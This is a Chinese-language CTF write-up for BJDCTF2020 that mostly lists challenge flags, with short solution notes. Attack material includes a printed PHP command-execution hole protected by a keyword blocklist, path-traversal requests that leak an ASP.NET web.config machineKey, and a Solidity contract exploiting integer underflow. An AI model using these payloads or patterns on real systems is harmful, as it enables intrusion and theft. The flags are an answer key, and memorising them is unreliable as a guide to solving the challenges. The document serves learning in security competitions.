

## 附件链接

https://github.com/BjdsecCA/BJDCTF2020_January



## Crypto

### 签到-y1ng
```
BJD{W3lc0me_T0_BJDCTF}
```



### 老文盲了
```
BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}
```



### 燕言燕语-y1ng
> yanzi ZJQ{xilzv_iqssuhoc_suzjg}

```
BJD{yanzi_jiushige_shabi}
```



### cat_flag
```
BJD{M!a0~}
```



### Y1nglish-y1ng
```
BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}
```



### 灵能精通-y1ng
```
flag{imknightstemplar}
```



### rsa0
> e=13678963
> p+q=18634122056753379716269087250919429904099975022851043295723769301042685857587616589600524104964609574654952831227940178170042162708578596790272315143180328
> p-q=-636070813885899079366025886638652161307245911330342143378027103421252546858748502942088075380111615997288725986295367813304470811451855418998245083530794
> c=22079888478101946741957726688485484791370993457400102463502857371178497742455297733909293780337766237079822656902258551868082936768360707644233191422893903911127819402683521436499250316001392592560673451102805992216089285279186950628804978270131684559490491437229910816248043252346993559747510210037227015427
>
> flag=??????

```
flag{5fae382e-aa38-4757-a5cf-034535422088}
```



### rsa1
> e=12669079
>
> p^2+q^2=210339802556662153109980848278500118268905439218850466299188927233625149285429313548951975692768933050404828454061380658512557260226751609673790307422729049292155405849818116005743875954148822193344381592133451314899041740389050613288470365257237486947364585091661415641584616778456772688387645906451131572530
>
> p-q=-484279488583125061451663011098463687444633322436368048072862800070712341496479172227330289646598284176582410468902150906410119329196892906305030439495536
>
> c=35685223421620471463580864334311170122507160181864629634672395897300044759578833030501463043300779387501974380159405949073689759372592633944230243919417580823679118922643284309780337350340948377408136981472977380019851772395853475228130640861759367772736753036536209240823961122488264551171179144849823183360
>
> flag=??????




## Misc

### 最简单的misc-y1ng

```
BJD{y1ngzuishuai}
```



### A_Beautiful_Picture

```
BJD{PnG_He1ghT_1s_WR0ng}
```



### 小姐姐-y1ng
> BJD{haokanma_xjj}



### TARGZ-y1ng
```
BJD{wow_you_can_rea11y_dance}
```



### Real_EasyBaBa
```
BJD{572154976}
```



### Imagin - 开场曲(x)
> 1.大写
> 2.mikutap
> 3.开场曲重复了两遍
> 4.flag交一遍的就行
> 5.格式BJD{字母+数字}
> 6.数字范围0-5
>
> https://aidn.jp/mikutap/



### EasyBaBa
> BJD{imagin_love_Y1ng}



### 圣火昭昭-y1ng
图片备注新佛曰：http://hi.pcmoe.net/buddha.html

解得gemlovecom，去掉com（题目问题）是隐写的key

outguess（题目描述）解隐写得到flag

```
BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}
```



## WEB

### fake google


### old-hack
> thinphp5




### duangShell
.index.php.swp下载源码swp，vi -r index.php.swp得到源码
```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>give me a girl</title>
</head>
<body>
    <center><h1>珍爱网</h1></center>
</body>
</html>
<?php
error_reporting(0);
echo "how can i give you source code? .swp?!"."<br>";
if (!isset($_POST['girl_friend'])) {
    die("where is P3rh4ps's girl friend ???");
} else {
    $girl = $_POST['girl_friend'];
    if (preg_match('/\>|\\\/', $girl)) {
        die('just girl');
    } else if (preg_match('/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i', $girl)) {
        echo "<img src='img/p3_need_beautiful_gf.png'> <!-- He is p3 -->";
    } else {
        //duangShell~~~~
        exec($girl);
    }
}
```
真flag在`/etc/demo/P3rh4ps/love/you/flag`




### 简单注入


### Schrödinger




### 文件探测



### EasyAspDotNet

/ImgLoad.aspx?path=../../ImgLoad.aspx
```
<%@ Page Language="C#" debug="true" trace="false"%>
<%@ Import namespace="System.IO" %>
<script runat="server">
    void Page_Load()
    {
        // 1.
        // Get path of byte file.
        string path = Server.MapPath("Web.config");

        // 2.
        // Get byte array of file.
        byte[] byteArray = File.ReadAllBytes("c:\\inetpub\\wwwroot\\static\\img\\" + Request.QueryString["path"]);

        // 3A.
        // Write byte array with BinaryWrite.
        Response.BinaryWrite(byteArray);

        // 3B.
        // Write with OutputStream.Write [commented out]
        // Response.OutputStream.Write(byteArray, 0, byteArray.Length);

        // 4.
        // Set content type.
        Response.ContentType = "image/png";
    }
</script>
```

/ImgLoad.aspx?path=../../Default.aspx
```
<%@ Page Language="C#" Inherits="SimpleLogin.Default" %>
<!DOCTYPE html>
<html>
<head runat="server">
	<title>Default</title>
</head>
<body>
	<form id="form1" runat="server">
        <asp:Image id="image1" runat="server" /><br>
		<asp:Button id="button1" runat="server" Text="Click me!" OnClick="button1Clicked" />
	</form>
</body>
</html>

```

/ImgLoad.aspx?path=../../web.config
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<machineKey validationKey="47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9" decryptionKey="B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5" validation="SHA1" decryption="3DES" />
</system.web>
</configuration>
```




## 区块链

### 坚固性？！
无符号整形溢出
```
pragma solidity ^0.4.23;
contract Trans{
    
    function getBalance() public returns (bool);

    
    function showBalance() public view returns (uint256);
    
    function Transfer(address[] _addr, uint256 _value) public returns (bool);
    
    function getFlag() public view returns (string);
}

contract Hack{

    function getBalance(Trans trans)payable public returns (bool){
        return trans.getBalance();
    }
    
    function showBalance(Trans trans) public view returns (uint256){
        return trans.showBalance();
    }

    
    function Transfer(Trans trans,address[] _addr) payable public returns (bool){
        uint256 _value = 0;
        _value = (_value-2)/2+5;
        return trans.Transfer(_addr,_value);
    }
    
    function getFlag(Trans trans) public view returns (string){
        return trans.getFlag();
    }
}
```
```
getBalance("0x09fafa182064b3eabBbDC3D13F8df3D0c0b6bce9")
Transfer("0x421DbB4ca0Fdb1872e5780BD95743085357CD7B8",["0xDf0972502956A8A35D2135097aAEfb80526C989c","0x09fafa182064b3eabBbDC3D13F8df3D0c0b6bce9"])
getFlag("0x09fafa182064b3eabBbDC3D13F8df3D0c0b6bce9")

0xDf0972502956A8A35D2135097aAEfb80526C989c是部署的合约地址
```

```
BJD{he1lo_bl0ck_Cha1n!}
```




## Reverse

### guessgame
IDA打开直接搜BJD，或者文本编辑器打开直接搜也行

```
BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}
```




### 8086

